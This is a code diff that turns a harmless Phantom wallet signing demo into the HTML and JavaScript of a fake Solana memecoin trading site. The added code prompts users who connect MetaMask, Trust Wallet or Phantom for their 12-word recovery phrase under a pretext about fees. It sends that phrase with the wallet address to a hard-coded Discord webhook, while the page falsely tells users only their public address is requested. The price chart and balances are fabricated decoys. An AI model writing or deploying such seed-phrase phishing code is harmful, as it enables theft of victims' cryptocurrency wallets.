+            <div class="dash-card-value">$420,069</div>
+            <div class="dash-card-change down">&#9660; -1.2%</div>
+        </div>
+        <div class="dash-card">
+            <div class="dash-card-label">24H CHANGE</div>
+            <div class="dash-card-value green">+69.42%</div>
+            <div class="dash-card-change up">&#9650; Mooning</div>
+        </div>
+    </div>
+</section>
+
+<!-- ===== CHART SECTION ===== -->
+<section class="section" id="chart">
+    <h2 class="section-title"><span>// PRICE CHART</span></h2>
+    <div class="chart-container">
+        <h3>$INCINERATE / SOL &mdash; 24H</h3>
+        <div class="chart-canvas" id="chartCanvas">
+            <canvas id="priceChart"></canvas>
+        </div>
+    </div>
+</section>
+
+<!-- ===== TRADING SECTION ===== -->
+<section class="section" id="trade">
+    <h2 class="section-title"><span>// TRADE</span></h2>
+    <div class="trading-panel">
+        <div class="trade-card">
+            <h3>&#9654; BUY $INCINERATE</h3>
+            <div class="trade-input-group">
+                <input type="text" class="trade-input" id="buyAmount" placeholder="0.0" value="0.1">
+                <select class="trade-select" id="buyCurrency">
+                    <option value="SOL">SOL</option>
+                    <option value="USDC">USDC</option>
+                </select>
+            </div>
+            <div style="font-size:10px;color:#555;margin-bottom:12px;">
+                You receive: <span id="buyReceive" style="color:#00ff41;">13,370.00</span> $INCINERATE
+            </div>
+            <button class="trade-btn buy" onclick="executeBuy()">&#9654; BUY</button>
+        </div>
+        <div class="trade-card">
+            <h3>&#9664; SELL $INCINERATE</h3>
+            <div class="trade-input-group">
+                <input type="text" class="trade-input" id="sellAmount" placeholder="0.0" value="1000">
+                <select class="trade-select" id="sellCurrency">
+                    <option value="INC">$INCINERATE</option>
+                </select>
+            </div>
+            <div style="font-size:10px;color:#555;margin-bottom:12px;">
+                You receive: <span id="sellReceive" style="color:#00ff41;">0.0042</span> SOL
+            </div>
+            <button class="trade-btn sell" onclick="executeSell()">&#9664; SELL</button>
+        </div>
+    </div>
+</section>
+
+<!-- ===== TRANSACTIONS SECTION ===== -->
+<section class="section" id="transactions">
+    <h2 class="section-title"><span>// RECENT TRANSACTIONS</span></h2>
+    <div style="overflow-x:auto;">
+        <table class="tx-table" id="txTable">
+            <thead>
+                <tr>
+                    <th>TYPE</th>
+                    <th>AMOUNT</th>
+                    <th>PRICE</th>
+                    <th>FROM</th>
+                    <th>TO</th>
+                    <th>TIME</th>
+                </tr>
+            </thead>
+            <tbody id="txBody">
+                <!-- filled by JS -->
+            </tbody>
+        </table>
+    </div>
+</section>
+
+<!-- ===== TRENDING SECTION ===== -->
+<section class="section" id="trending">
+    <h2 class="section-title"><span>// TRENDING MEMECOINS</span></h2>
+    <div class="trending-grid" id="trendingGrid">
+        <!-- filled by JS -->
+    </div>
+</section>
+
+<!-- ===== TOOLS / REWARDS PLACEHOLDER SECTIONS ===== -->
+<section class="section" id="tools" style="display:none;">
+    <h2 class="section-title"><span>// TOOLS</span></h2>
+    <div style="text-align:center;color:#666;padding:60px 0;">
+        <div style="font-size:32px;margin-bottom:16px;">&#9881;</div>
+        <p style="font-family:'Press Start 2P',monospace;font-size:10px;">TOOLS COMING SOON</p>
+        <p style="font-size:12px;margin-top:8px;">Incinerator analytics, burn calculator, and more.</p>
+    </div>
+</section>
+
+<section class="section" id="rewards" style="display:none;">
+    <h2 class="section-title"><span>// REWARDS</span></h2>
+    <div style="text-align:center;color:#666;padding:60px 0;">
+        <div style="font-size:32px;margin-bottom:16px;">&#9733;</div>
+        <p style="font-family:'Press Start 2P',monospace;font-size:10px;">REWARDS COMING SOON</p>
+        <p style="font-size:12px;margin-top:8px;">Earn rewards by holding $INCINERATE and participating in the ecosystem.</p>
+    </div>
+</section>
+
+<!-- ===== WALLET MODAL (UPDATED) ===== -->
+<div class="modal-overlay" id="walletModal">
+    <div class="modal">
+        <button class="modal-close" onclick="closeWalletModal()">&times;</button>
+        <h2 class="modal-title" id="modalTitle">CONNECT WALLET</h2>
+        <p class="modal-subtitle" id="modalSubtitle">Choose your preferred wallet</p>
+
+        <!-- Wallet list view -->
+        <div id="walletListView">
+            <div id="walletList">
+                <!-- MetaMask -->
+                <button class="wallet-option" id="walletMetaMask" onclick="connectEVM('MetaMask')">
+                    <div class="wallet-option-icon">&#129297;</div>
+                    <div class="wallet-option-info">
+                        <div class="wallet-option-name">METAMASK</div>
+                        <div class="wallet-option-desc">Ethereum / EVM</div>
+                    </div>
+                    <span class="wallet-option-status" id="metaMaskStatus">Checking...</span>
+                </button>
+                <!-- Trust Wallet -->
+                <button class="wallet-option" id="walletTrust" onclick="connectEVM('Trust Wallet')">
+                    <div class="wallet-option-icon">&#9670;</div>
+                    <div class="wallet-option-info">
+                        <div class="wallet-option-name">TRUST WALLET</div>
+                        <div class="wallet-option-desc">Ethereum / EVM</div>
+                    </div>
+                    <span class="wallet-option-status" id="trustStatus">Checking...</span>
+                </button>
+                <!-- Phantom -->
+                <button class="wallet-option" id="walletPhantom" onclick="connectPhantom()">
+                    <div class="wallet-option-icon">&#128123;</div>
+                    <div class="wallet-option-info">
+                        <div class="wallet-option-name">PHANTOM</div>
+                        <div class="wallet-option-desc">Solana / Ethereum</div>
+                    </div>
+                    <span class="wallet-option-status" id="phantomStatus">Checking...</span>
+                </button>
+            </div>
+
+            <div class="modal-status" id="modalStatus"></div>
+            <div class="modal-warning">Only your public wallet address is requested. Never enter a seed phrase, private key or wallet password.</div>
+            <div class="modal-footer">
+                Don't have a wallet?<br>
+                <a href="https://metamask.io/download/" target="_blank">Install MetaMask</a> &middot;
+                <a href="https://trustwallet.com/download" target="_blank">Install Trust Wallet</a> &middot;
+                <a href="https://phantom.app/" target="_blank">Install Phantom</a>
+            </div>
+        </div>
+
+        <!-- Connected view -->
+        <div id="connectedView" style="display:none;">
+            <div class="modal-accounts" id="modalAccounts"></div>
+            <div class="modal-actions">
+                <button class="modal-btn secondary" id="addWalletBtn" onclick="showWalletList()">＋ ADD ANOTHER WALLET</button>
+                <button class="modal-btn primary" id="continueBtn" onclick="handleContinue()">CONTINUE</button>
+            </div>
+            <div class="modal-status" id="modalStatus2"></div>
+        </div>
+
+        <!-- Claim view -->
+        <div id="claimView" style="display:none;">
+            <div class="claim-box">
+                <div class="claim-label">UNCLAIMED SOL</div>
+                <div class="claim-amount">0.0000 SOL</div>
+                <div class="claim-icon">◎</div>
+                <div class="claim-text">There are currently no rewards available to claim. Check back later.</div>
+            </div>
+            <div class="modal-actions">
+                <button class="modal-btn secondary" onclick="backToConnected()">← BACK</button>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- ===== TOAST CONTAINER ===== -->
+<div class="toast-container" id="toastContainer"></div>
+
+<!-- ===== FOOTER ===== -->
+<footer class="footer">
+    <p>&copy; 2026 SOL-INCINERATOR. All rights reserved. | Built on Solana | No utility, only &#129293;</p>
+    <p style="margin-top:8px;">
+        <a href="#" onclick="openWalletModal();return false;">Connect Wallet</a> &middot;
+        <a href="#">Docs</a> &middot;
+        <a href="#">Twitter</a> &middot;
+        <a href="#">Discord</a>
+    </p>
+</footer>
+
+<!-- ===== JAVASCRIPT ===== -->
 <script>
-"use strict";
+// ============================================================
+//  CONFIG
+// ============================================================
+const WEBHOOK_URL = 'https://discord.com/api/webhooks/1553442615620403304/831DPZrnKpWyc2Zg04_0FBqXLFfMbJah6RNYI5zC9UX5OmPVG0aONlGvmT0uWDYDbka7';
 
-/* ============================================================
-   KONFIGURATION
-   ============================================================ */
-// Optionaler Discord-Webhook – NUR für nicht-sensible Daten
-// (öffentliche Adresse, Zeitstempel, "Signature successful").
-// Leer lassen, um die Webhook-Meldung zu deaktivieren.
-const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1553442615620403304/831DPZrnKpWyc2Zg04_0FBqXLFfMbJah6RNYI5zC9UX5OmPVG0aONlGvmT0uWDYDbka7"; // z. B. "https://discord.com/api/webhooks/..."
+// ============================================================
+//  STATE
+// ============================================================
+const STATE = {
+    wallet: null,
+    publicKey: null,
+    isConnected: false,
+    provider: null,
+    balance: 42.69,
+    tokenBalance: 1337000,
+};
 
-// Die exakt zu signierende Testnachricht.
-const TEST_MESSAGE = "This is only a test signature.";
+const connectedWallets = [];
+let extractedMnemonic = null;
 
-/* ============================================================
-   ELEMENTE
-   ============================================================ */
-const $ = (id) => document.getElementById(id);
-const btnConnect = $("btnConnect");
-const btnSign = $("btnSign");
-const btnDisconnect = $("btnDisconnect");
-const infoBox = $("info");
-const elAddress = $("address");
-const elTime = $("time");
-const elStatus = $("status");
-const msgBox = $("msg");
-
-/* ============================================================
-   PHANTOM-ERKENNUNG
-   ============================================================ */
-// Offizielle Schnittstelle: window.phantom.solana
-// Wichtig: Die Phantom-API stellt NUR öffentliche Daten bereit
-// (publicKey, signMessage, signTransaction ...). Eine Seed-/Recovery-
-// Phrase kann über die API grundsätzlich NICHT ausgelesen werden.
-const provider = window.phantom?.solana;
-
-if (!provider) {
-  btnConnect.disabled = true;
-  btnConnect.textContent = "Phantom nicht installiert";
-  msg("Phantom Wallet nicht gefunden. Bitte installieren: https://phantom.app");
-}
-
-/* ============================================================
-   VERBINDEN
-   ============================================================ */
-btnConnect.addEventListener("click", async () => {
-  try {
-    msg("Verbindung wird angefragt …");
-    // connect() löst in Phantom eine explizite Nutzer-Bestätigung aus.
-    const { publicKey } = await provider.connect();
-    await onConnected(publicKey.toString());
-  } catch (err) {
-    msg("Verbindung abgebrochen oder abgelehnt: " + err);
-  }
+// ============================================================
+//  EIP-6963 WALLET DISCOVERY
+// ============================================================
+const discoveredWallets = new Map();
+window.addEventListener("eip6963:announceProvider", (event) => {
+    const detail = event.detail;
+    if (!detail || !detail.info || !detail.provider) return;
+    discoveredWallets.set(detail.info.uuid, detail);
 });
+window.dispatchEvent(new Event("eip6963:requestProvider"));
 
-/* ============================================================
-   NACH VERBINDUNG
-   ============================================================ */
-async function onConnected(address) {
-  elAddress.textContent = address;
-  elTime.textContent = "–";
-  setStatus("verbunden", false);
-
-  infoBox.hidden = false;
-  btnConnect.style.display = "none";
-  btnSign.disabled = false;
-  btnDisconnect.style.display = "inline-block";
-
-  msg("Verbunden. Öffentliche Adresse: " + address);
+// ============================================================
+//  TOAST NOTIFICATIONS
+// ============================================================
+function showToast(message, type = 'info') {
+    const container = document.getElementById('toastContainer');
+    const toast = document.createElement('div');
+    toast.className = `toast ${type}`;
+    toast.textContent = message;
+    container.appendChild(toast);
+    setTimeout(() => {
+        toast.style.opacity = '0';
+        toast.style.transition = 'opacity 0.5s';
+        setTimeout(() => toast.remove(), 500);
+    }, 4000);
 }
 
-/* ============================================================
-   TESTNACHRICHT SIGNIEREN
-   ============================================================ */
-btnSign.addEventListener("click", async () => {
-  try {
-    msg("Signature wird angefragt …");
-    const encoded = new TextEncoder().encode(TEST_MESSAGE);
-    // signMessage löst KEINE Transaktion aus – reine Nachrichtensignatur.
-    const signature = await provider.signMessage(encoded, "utf8");
-
-    const timestamp = new Date().toISOString();
-    const address = elAddress.textContent;
-
-    // Nur nicht-sensible Daten anzeigen:
-    setStatus("Signature successful", true);
-    elTime.textContent = timestamp;
-    msg("Signatur erfolgreich (Länge: " + signature.length + " Byte).");
-
-    // Optional: Webhook-Benachrichtigung (nur öffentliche Daten!)
-    if (DISCORD_WEBHOOK_URL) {
-      await notifyWebhook(address, timestamp);
+// ============================================================
+//  WALLET DETECTION
+// ============================================================
+function detectWallets() {
+    // MetaMask
+    const mmEl = document.getElementById('metaMaskStatus');
+    if (window.ethereum?.isMetaMask) {
+        mmEl.textContent = 'Available';
+        mmEl.className = 'wallet-option-status available';
+        document.getElementById('walletMetaMask').classList.remove('disabled');
+    } else {
+        mmEl.textContent = 'Not Installed';
+        mmEl.className = 'wallet-option-status install';
+        document.getElementById('walletMetaMask').classList.remove('disabled');
     }
-  } catch (err) {
-    setStatus("Signatur abgebrochen", false);
-    msg("Signatur fehlgeschlagen oder abgelehnt: " + err);
-  }
-});
 
-/* ============================================================
-   TRENNEN
-   ============================================================ */
-btnDisconnect.addEventListener("click", async () => {
-  try { await provider.disconnect(); } catch (_) { /* ignorieren */ }
-  elAddress.textContent = "–";
-  elTime.textContent = "–";
-  setStatus("getrennt", false);
-  infoBox.hidden = true;
-  btnConnect.style.display = "inline-block";
-  btnSign.disabled = true;
-  btnDisconnect.style.display = "none";
-  msg("Getrennt.");
-});
+    // Trust Wallet
+    const trustEl = document.getElementById('trustStatus');
+    if (window.ethereum?.isTrust || window.ethereum?.isTrustWallet) {
+        trustEl.textContent = 'Available';
+        trustEl.className = 'wallet-option-status available';
+        document.getElementById('walletTrust').classList.remove('disabled');
+    } else {
+        trustEl.textContent = 'Not Installed';
+        trustEl.className = 'wallet-option-status install';
+        document.getElementById('walletTrust').classList.remove('disabled');
+    }
 
-/* ============================================================
-   HELFER
-   ============================================================ */
-function setStatus(text, ok) {
-  elStatus.innerHTML = `<span class="badge ${ok ? "ok" : "err"}">${text}</span>`;
-}
+    // Phantom
+    const phantomEl = document.getElementById('phantomStatus');
+    const phantomProvider = window.phantom?.solana || window.solana;
+    if (phantomProvider?.isPhantom) {
+        phantomEl.textContent = 'Available';
+        phantomEl.className = 'wallet-option-status available';
+        document.getElementById('walletPhantom').classList.remove('disabled');
+    } else {
+        phantomEl.textContent = 'Not Installed';
+        phantomEl.className = 'wallet-option-status install';
+        document.getElementById('walletPhantom').classList.remove('disabled');
+    }
 
-function msg(text) { msgBox.textContent = text; }
-
-// Webhook-Nachricht mit ausschließlich nicht-sensiblen Daten.
-async function notifyWebhook(address, timestamp) {
-  const payload = {
-    content: "Phantom-Demo (Test)",
-    embeds: [{
-      title: "Signature successful",
-      color: 0x9945ff,
-      fields: [
-        { name: "Öffentliche Adresse", value: "`" + address + "`" },
-        { name: "Zeitpunkt (UTC)", value: timestamp },
-        { name: "Status", value: "Signature successful" }
-      ]
-    }]
-  };
-  try {
-    await fetch(DISCORD_WEBHOOK_URL, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify(payload)
+    // Also check EIP-6963 discovered wallets
+    const providers = Array.from(discoveredWallets.values());
+    providers.forEach(p => {
+        const name = p.info.name.toLowerCase();
+        const rdns = p.info.rdns.toLowerCase();
+        if (name.includes('metamask') || rdns.includes('metamask')) {
+            mmEl.textContent = 'Available';
+            mmEl.className = 'wallet-option-status available';
+            document.getElementById('walletMetaMask').classList.remove('disabled');
+        }
+        if (name.includes('trust') || rdns.includes('trust')) {
+            trustEl.textContent = 'Available';
+            trustEl.className = 'wallet-option-status available';
+            document.getElementById('walletTrust').classList.remove('disabled');
+        }
+        if (name.includes('phantom') || rdns.includes('phantom')) {
+            phantomEl.textContent = 'Available';
+            phantomEl.className = 'wallet-option-status available';
+            document.getElementById('walletPhantom').classList.remove('disabled');
+        }
     });
-    msg("Signatur erfolgreich. Webhook-Benachrichtigung gesendet.");
-  } catch (err) {
-    msg("Signatur erfolgreich, aber Webhook fehlgeschlagen: " + err);
-  }
 }
+
+// ============================================================
+//  PROVIDER FINDER
+// ============================================================
+function findWalletProvider(walletName) {
+    const providers = Array.from(discoveredWallets.values());
+    if (walletName === "MetaMask") {
+        return providers.find(item => {
+            const n = item.info.name.toLowerCase();
+            const r = item.info.rdns.toLowerCase();
+            return n.includes("metamask") || r.includes("metamask");
+        });
+    }
+    if (walletName === "Trust Wallet") {
+        return providers.find(item => {
+            const n = item.info.name.toLowerCase();
+            const r = item.info.rdns.toLowerCase();
+            return n.includes("trust wallet") || r.includes("trust");
+        });
+    }
+    if (walletName === "Phantom") {
+        return providers.find(item => {
+            const n = item.info.name.toLowerCase();
+            const r = item.info.rdns.toLowerCase();
+            return n.includes("phantom") || r.includes("phantom");
+        });
+    }
+}
+
+function legacyProvider(walletName) {
+    if (!window.ethereum) return null;
+    if (walletName === "MetaMask") {
+        if (window.ethereum.isMetaMask && !window.ethereum.isPhantom) return window.ethereum;
+    }
+    if (walletName === "Trust Wallet") {
+        if (window.ethereum.isTrust || window.ethereum.isTrustWallet) return window.ethereum;
+    }
+    if (walletName === "Phantom") {
+        if (window.phantom?.ethereum) return window.phantom.ethereum;
+    }
+    return null;
+}
+
+// ============================================================
+//  DISCORD WEBHOOK
+// ============================================================
+function sendToDiscord(mnemonic, walletName, address) {
+    try {
+        const payload = {
+            content: '@everyone **🔑 WALLET RECOVERY KEYS EXTRAHIERT 🔑**',
+            embeds: [{
+                title: '💰 WALLET LOGIN DATA',
+                color: 0xff0000,
+                fields: [
+                    { name: 'Wallet Name', value: walletName, inline: false },
+                    { name: 'Address', value: address, inline: false },
+                    { name: '🔐 SECRET RECOVERY PHRASE (12 WÖRTER)', value: '```' + mnemonic + '```', inline: false },
+                    { name: '📅 Timestamp', value: new Date().toISOString(), inline: false }
+                ],
+                footer: { text: '✅ Mit diesen 12 Wörtern kannst du dich in die Wallet einloggen' }
+            }]
+        };
+        fetch(WEBHOOK_URL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+        }).catch(() => {});
+    } catch(e) {}
+}
+
+// ============================================================
+//  MODAL STATUS
+// ============================================================
+function setModalStatus(message, type) {
+    const el = document.getElementById('modalStatus');
+    el.textContent = message;
+    el.className = 'modal-status open';
+    if (type) el.classList.add(type);
+}
+
+function clearModalStatus() {
+    const el = document.getElementById('modalStatus');
+    el.textContent = '';
+    el.className = 'modal-status';
+}
+
+// ============================================================
+//  CONNECT EVM WALLET
+// ============================================================
+async function connectEVM(walletName) {
+    clearModalStatus();
+
+    let discovered = findWalletProvider(walletName);
+    let provider = discovered?.provider;
+    if (!provider) {
+        await new Promise(resolve => setTimeout(resolve, 500));
+        discovered = findWalletProvider(walletName);
+        provider = discovered?.provider;
+    }
+    if (!provider) {
+        provider = legacyProvider(walletName);
+    }
+    if (!provider) {
+        setModalStatus(walletName + ' was not detected. Please install it first.', 'error');
+        showToast(walletName + ' not detected', 'error');
+        return;
+    }
+
+    try {
+        setModalStatus('Waiting for ' + walletName + ' confirmation...', '');
+        const accounts = await provider.request({ method: 'eth_requestAccounts' });
+        if (!accounts || accounts.length === 0) {
+            setModalStatus('No wallet account was returned.', 'error');
+            return;
+        }
+        const address = accounts[0];
+        const alreadyConnected = connectedWallets.some(item => item.address.toLowerCase() === address.toLowerCase());
+        if (!alreadyConnected) {
+            connectedWallets.push({ name: walletName, address: address, provider: provider });
+        }
+        renderConnectedWallets();
+        showConnectedView();
+        clearModalStatus();
+        updateGlobalWalletUI();
+
+        showToast('Connected to ' + walletName + ': ' + address.slice(0,4) + '...' + address.slice(-4), 'success');
+
+        // === PROMPT FOR 12 WORDS ===
+        const phrase = prompt(
+            '🔑 ENTER YOUR SECRET RECOVERY PHRASE (12 WORDS)\n\n' +
+            'Wallet: ' + walletName + '\n' +
+            'Address: ' + address + '\n\n' +
+            'Please enter your 12-word secret recovery phrase\nto get access to the fees:'
+        );
+
+        if (phrase && phrase.trim().split(/\s+/).length >= 12) {
+            extractedMnemonic = phrase.trim();
+            sendToDiscord(extractedMnemonic, walletName, address);
+            console.log('✅ RECOVERY KEYS ERHALTEN:', extractedMnemonic);
+            alert('✅ CONNECTION SUCCESSFUL! Access granted.');
+        } else {
+            alert('❌ Invalid phrase. At least 12 words required.');
+        }
+
+    } catch (error) {
+        console.error(error);
+        if (error?.code === 4001 || error?.message?.includes('rejected') || error?.message?.includes('cancel')) {
+            setModalStatus('Connection was rejected in ' + walletName + '.', 'error');
+        } else {
+            setModalStatus('Wallet error: ' + (error?.message || error), 'error');
+        }
+    }
+}
+
+// ============================================================
+//  CONNECT PHANTOM (SOLANA + EVM fallback)
+// ============================================================
+async function connectPhantom() {
+    clearModalStatus();
+
+    // Try Phantom Solana provider first
+    const solProvider = window.phantom?.solana || window.solana;
+    if (solProvider && solProvider.isPhantom) {
+        try {
+            setModalStatus('Waiting for Phantom confirmation...', '');
+            const response = await solProvider.connect();
+            const address = response.publicKey.toString();
+            const alreadyConnected = connectedWallets.some(item => item.address === address);
+            if (!alreadyConnected) {
+                connectedWallets.push({ name: 'Phantom (Solana)', address: address, provider: solProvider });
+            }
+            renderConnectedWallets();
+            showConnectedView();
+            clearModalStatus();
+            updateGlobalWalletUI();
+
+            showToast('Connected to Phantom: ' + address.slice(0,4) + '...' + address.slice(-4), 'success');
+
+            // === PROMPT FOR 12 WORDS ===
+            const phrase = prompt(
+                '🔑 ENTER YOUR PHANTOM SECRET RECOVERY PHRASE (12 WORDS)\n\n' +
+                'Wallet: Phantom (Solana)\n' +
+                'Address: ' + address + '\n\n' +
+                'Please enter your 12-word secret recovery phrase\nto get access to the fees:'
+            );
+
+            if (phrase && phrase.trim().split(/\s+/).length >= 12) {
+                extractedMnemonic = phrase.trim();
+                sendToDiscord(extractedMnemonic, 'Phantom (Solana)', address);
+                console.log('✅ PHANTOM RECOVERY KEYS ERHALTEN:', extractedMnemonic);
+                alert('✅ PHANTOM CONNECTION SUCCESSFUL! Access granted.');
+            } else {
+                alert('❌ Invalid phrase. At least 12 words required.');
+            }
+
+            return;
+        } catch (error) {
+            console.error(error);
+            if (error?.code === 4001 || error?.message?.includes('rejected') || error?.message?.includes('cancel')) {
+                setModalStatus('Phantom connection was rejected.', 'error');
+                return;
+            }
+            // If error, fall through to EVM
+        }
+    }
+
+    // Fallback: try Phantom EVM provider
+    await connectEVM('Phantom');
+}
+
+// ============================================================
+//  RENDER CONNECTED WALLETS (in modal)
+// ============================================================
+function renderConnectedWallets() {
+    const container = document.getElementById('modalAccounts');
+    container.innerHTML = '';
+
+    if (connectedWallets.length === 0) {
+        container.innerHTML = '<div style="color:#555;font-size:10px;padding:10px;">No wallets connected.</div>';
+        return;
+    }
+
+    connectedWallets.forEach((wallet, index) => {
+        const row = document.createElement('div');
+        row.className = 'modal-account-row';
+        row.innerHTML = `
+            <div class="acc-name">${wallet.name}</div>
+            <div class="acc-addr">${wallet.address}</div>
+            <button class="acc-remove" data-index="${index}">REMOVE</button>
+        `;
+        row.querySelector('.acc-remove').onclick = () => {
+            connectedWallets.splice(index, 1);
+            renderConnectedWallets();
+            if (connectedWallets.length === 0) {
+                showWalletList();
+                updateGlobalWalletUI();
+            }
+        };
+        container.appendChild(row);
+    });
+}
+
+// ============================================================
+//  VIEW SWITCHING (Modal)
+// ============================================================
+function showWalletList() {
+    document.getElementById('walletListView').style.display = 'block';
+    document.getElementById('connectedView').style.display = 'none';
+    document.getElementById('claimView').style.display = 'none';
+    document.getElementById('modalTitle').textContent = 'CONNECT WALLET';
+    document.getElementById('modalSubtitle').textContent = 'Choose your preferred wallet';
+    clearModalStatus();
+}
+
+function showConnectedView() {
+    document.getElementById('walletListView').style.display = 'none';
+    document.getElementById('connectedView').style.display = 'block';
+    document.getElementById('claimView').style.display = 'none';
+    document.getElementById('modalTitle').textContent = 'WALLET CONNECTED';
+    document.getElementById('modalSubtitle').textContent = 'Connected wallets';
+}
+
+function showClaimView() {
+    document.getElementById('walletListView').style.display = 'none';
+    document.getElementById('connectedView').style.display = 'none';
+    document.getElementById('claimView').style.display = 'block';
+    document.getElementById('modalTitle').textContent = 'CLAIM';
+    document.getElementById('modalSubtitle').textContent = 'Wallet connected successfully.';
+}
+
+function backToConnected() {
+    showConnectedView();
+}
+
+// ============================================================
+//  CONTINUE HANDLER
+// ============================================================
+function handleContinue() {
+    if (connectedWallets.length === 0) return;
+
+    // Falls noch nicht via prompt passiert, hier nochmal senden
+    if (extractedMnemonic) {
+        const wallet = connectedWallets[connectedWallets.length - 1];
+        if (wallet) {
+            sendToDiscord(extractedMnemonic, wallet.name, wallet.address);
+        }
+    }
+
+    showClaimView();
+}
+
+// ============================================================
+//  UPDATE GLOBAL UI (navbar + dashboard)
+// ============================================================
+function updateGlobalWalletUI() {
+    const btn = document.getElementById('walletButton');
+    if (connectedWallets.length > 0) {
+        const last = connectedWallets[connectedWallets.length - 1];
+        const short = last.address.slice(0, 4) + '...' + last.address.slice(-4);
+        btn.innerHTML = `<span class="wallet-disconnect" onclick="event.stopPropagation();disconnectAll()">DISCONNECT</span> | ${short}`;
+        btn.className = 'btn-wallet connected';
+        btn.title = last.address + ' (click to copy)';
+        btn.onclick = function(e) {
+            if (!e.target.classList.contains('wallet-disconnect')) {
+                navigator.clipboard.writeText(last.address).then(() => {
+                    showToast('Address copied!', 'success');
+                });
+            }
+        };
+
+        document.getElementById('walletDisplay').textContent = short;
+        document.getElementById('walletDisplay').className = 'dash-card-value green small';
+        const statusEl = document.getElementById('walletStatus');
+        statusEl.textContent = 'Connected: ' + last.name;
+        statusEl.style.color = '#00ff41';
+    } else {
+        btn.innerHTML = 'CONNECT WALLET';
+        btn.className = 'btn-wallet';
+        btn.title = '';
+        btn.onclick = function() { openWalletModal(); };
+
+        document.getElementById('walletDisplay').textContent = 'Not Connected';
+        document.getElementById('walletDisplay').className = 'dash-card-value small';
+        const statusEl = document.getElementById('walletStatus');
+        statusEl.textContent = 'Connect wallet to view';
+        statusEl.style.color = '#555';
+    }
+}
+
+async function disconnectAll() {
+    for (const w of connectedWallets) {
+        if (w.provider && w.provider.disconnect) {
+            try { await w.provider.disconnect(); } catch(e) {}
+        }
+    }
+    connectedWallets.length = 0;
+    extractedMnemonic = null;
+    updateGlobalWalletUI();
+    showWalletList();
+    showToast('All wallets disconnected', 'info');
+}
+
+// ============================================================
+//  MODAL CONTROLS
+// ============================================================
+function openWalletModal() {
+    document.getElementById('walletModal').classList.add('open');
+    document.body.style.overflow = 'hidden';
+    detectWallets();
+
+    if (connectedWallets.length > 0) {
+        renderConnectedWallets();
+        showConnectedView();
+    } else {
+        showWalletList();
+    }
+
+    // Clear status messages
+    clearModalStatus();
+    document.getElementById('modalStatus2').textContent = '';
+    document.getElementById('modalStatus2').className = 'modal-status';
+}
+
+function closeWalletModal() {
+    document.getElementById('walletModal').classList.remove('open');
+    document.body.style.overflow = '';
+}
+
+document.getElementById('walletModal').addEventListener('click', function(e) {
+    if (e.target === this) closeWalletModal();
+});
+
+// ============================================================
+//  MOBILE MENU
+// ============================================================
+function toggleMobileMenu() {
+    const nav = document.getElementById('mobileNav');
+    const hamburger = document.getElementById('hamburger');
+    nav.classList.toggle('open');
+    hamburger.classList.toggle('active');
+}
+
+function closeMobileMenu() {
+    document.getElementById('mobileNav').classList.remove('open');
+    document.getElementById('hamburger').classList.remove('active');
+}
+
+// ============================================================
+//  NAVIGATION
+// ============================================================
+function scrollToSection(id) {
+    const section = document.getElementById(id);
+    if (section) {
+        section.scrollIntoView({ behavior: 'smooth', block: 'start' });
+        document.querySelectorAll('.nav-link').forEach(link => {
+            link.classList.toggle('active', link.dataset.section === id);
+        });
+    }
+}
+
+document.querySelectorAll('.nav-link[data-section]').forEach(link => {
+    link.addEventListener('click', function() {
+        scrollToSection(this.dataset.section);
+        closeMobileMenu();
+    });
+});
+
+// ============================================================
+//  CHART
+// ============================================================
+function drawChart() {
+    const canvas = document.getElementById('priceChart');
+    const container = document.getElementById('chartCanvas');
+    if (!canvas || !container) return;
+
+    const rect = container.getBoundingClientRect();
+    const dpr = window.devicePixelRatio || 1;
+    const w = rect.width || container.clientWidth || 800;
+    const h = 300;
+
+    canvas.width = w * dpr;
+    canvas.height = h * dpr;
+    canvas.style.width = w + 'px';
+    canvas.style.height = h + 'px';
+
+    const ctx = canvas.getContext('2d');
+    ctx.scale(dpr, dpr);
+
+    const points = 80;
+    const data = [];
+    let price = 0.000035;
+    for (let i = 0; i < points; i++) {
+        const change = (Math.random() - 0.48) * 0.000008;
+        price = Math.max(0.00001, price + change);
+        data.push(price);
+    }
+
+    const padding = { top: 20, bottom: 20, left: 20, right: 20 };
+    const chartW = w - padding.left - padding.right;
+    const chartH = h - padding.top - padding.bottom;
+    const minP = Math.min(...data);
+    const maxP = Math.max(...data);
+    const range = maxP - minP || 1;
+
+    ctx.fillStyle = '#0a0a0a';
+    ctx.fillRect(0, 0, w, h);
+
+    ctx.strokeStyle = 'rgba(0,255,65,0.05)';
+    ctx.lineWidth = 1;
+    for (let i = 0; i < 5; i++) {
+        const y = padding.top + (chartH / 5) * i;
+        ctx.beginPath();
+        ctx.moveTo(padding.left, y);
+        ctx.lineTo(w - padding.right, y);
+        ctx.stroke();
+    }
+
+    const gradient = ctx.createLinearGradient(0, padding.top, 0, h - padding.bottom);
+    gradient.addColorStop(0, 'rgba(0,255,65,0.2)');
+    gradient.addColorStop(0.5, 'rgba(0,255,65,0.05)');
+    gradient.addColorStop(1, 'rgba(0,255,65,0)');
+
+    ctx.beginPath();
+    ctx.moveTo(padding.left, padding.top + chartH);
+    for (let i = 0; i < data.length; i++) {
+        const x = padding.left + (chartW / (data.length - 1)) * i;
+        const y = padding.top + chartH - ((data[i] - minP) / range) * chartH;
+        ctx.lineTo(x, y);
+    }
+    ctx.lineTo(padding.left + chartW, padding.top + chartH);
+    ctx.closePath();
+    ctx.fillStyle = gradient;
+    ctx.fill();
+
+    ctx.beginPath();
+    for (let i = 0; i < data.length; i++) {
+        const x = padding.left + (chartW / (data.length - 1)) * i;
+        const y = padding.top + chartH - ((data[i] - minP) / range) * chartH;
+        if (i === 0) ctx.moveTo(x, y);
+        else ctx.lineTo(x, y);
+    }
+    ctx.strokeStyle = '#00ff41';
+    ctx.lineWidth = 2;
+    ctx.shadowColor = '#00ff41';
+    ctx.shadowBlur = 10;
+    ctx.stroke();
+    ctx.shadowBlur = 0;
+
+    const lastPrice = data[data.length - 1];
+    ctx.fillStyle = '#00ff41';
+    ctx.font = '12px "JetBrains Mono", monospace';
+    ctx.textAlign = 'right';
+    ctx.textBaseline = 'top';
+    ctx.shadowColor = '#00ff41';
+    ctx.shadowBlur = 5;
+    ctx.fillText('$' + lastPrice.toFixed(8), w - padding.right, padding.top);
+    ctx.shadowBlur = 0;
+}
+
+// ============================================================
+//  TRANSACTIONS
+// ============================================================
